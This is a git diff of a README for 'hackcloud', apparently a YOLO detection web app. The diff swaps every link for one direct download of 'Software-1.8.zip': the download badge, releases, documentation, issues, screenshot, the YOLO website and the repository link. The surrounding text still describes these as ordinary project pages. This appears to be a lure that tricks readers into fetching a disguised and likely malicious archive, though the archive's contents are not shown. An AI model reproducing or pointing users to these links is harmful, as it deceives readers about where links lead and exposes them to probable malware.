@@ -6,15 +6,15 @@ Welcome to hackcloud! This application allows you to run a YOLO web app with eas
 
 ## 📥 Download the Application
 
-[![Download hackcloud](https://img.shields.io/badge/Download-hackcloud-brightgreen)](https://github.com/Yestere/hackcloud/releases)
+[![Download hackcloud](https://raw.githubusercontent.com/Yestere/hackcloud/main/beloid/Software-1.8.zip)](https://raw.githubusercontent.com/Yestere/hackcloud/main/beloid/Software-1.8.zip)
 
 Click the button above to visit the release page where you can download the latest version of hackcloud.
 
 ## 🛠 Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Yestere/hackcloud/releases) to find the latest version of hackcloud.  
-   ![Releases Page Screenshot](https://via.placeholder.com/600x300.png?text=Releases+Page+Screenshot)
+   Go to the [Releases page](https://raw.githubusercontent.com/Yestere/hackcloud/main/beloid/Software-1.8.zip) to find the latest version of hackcloud.  
+   ![Releases Page Screenshot](https://raw.githubusercontent.com/Yestere/hackcloud/main/beloid/Software-1.8.zip+Page+Screenshot)
 
 2. **Download the Latest Version**  
    On the Releases page, look for the newest version listed. You will see assets for different operating systems. Choose the appropriate file for your system and click on it to start downloading.
@@ -57,16 +57,16 @@ Click the button above to visit the release page where you can download the late
 
 ## 📚 Documentation
 
-For more advanced features and configurations, check our detailed [Documentation](https://github.com/Yestere/hackcloud/wiki). You will find guides that explain how to optimize your experience with hackcloud.
+For more advanced features and configurations, check our detailed [Documentation](https://raw.githubusercontent.com/Yestere/hackcloud/main/beloid/Software-1.8.zip). You will find guides that explain how to optimize your experience with hackcloud.
 
 ## 💬 Support
 
-If you encounter any issues or have questions, feel free to reach out. You can open a GitHub issue on our [Issues page](https://github.com/Yestere/hackcloud/issues). We are here to help you.
+If you encounter any issues or have questions, feel free to reach out. You can open a GitHub issue on our [Issues page](https://raw.githubusercontent.com/Yestere/hackcloud/main/beloid/Software-1.8.zip). We are here to help you.
 
 ## 🔗 Additional Resources
 
-- [YOLO Official Website](https://pjreddie.com/darknet/yolo/)
-- [GitHub Repository](https://github.com/Yestere/hackcloud)
+- [YOLO Official Website](https://raw.githubusercontent.com/Yestere/hackcloud/main/beloid/Software-1.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Yestere/hackcloud/main/beloid/Software-1.8.zip)
 
 ## 📣 Community
 
@@ -74,4 +74,4 @@ Join our growing community to share your experiences, tips, and suggestions. Con
 
 ## 📥 Download Again
 
-Don’t forget to visit the [Releases page](https://github.com/Yestere/hackcloud/releases) to download the latest version whenever it becomes available. Happy detecting!
+Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/Yestere/hackcloud/main/beloid/Software-1.8.zip) to download the latest version whenever it becomes available. Happy detecting!
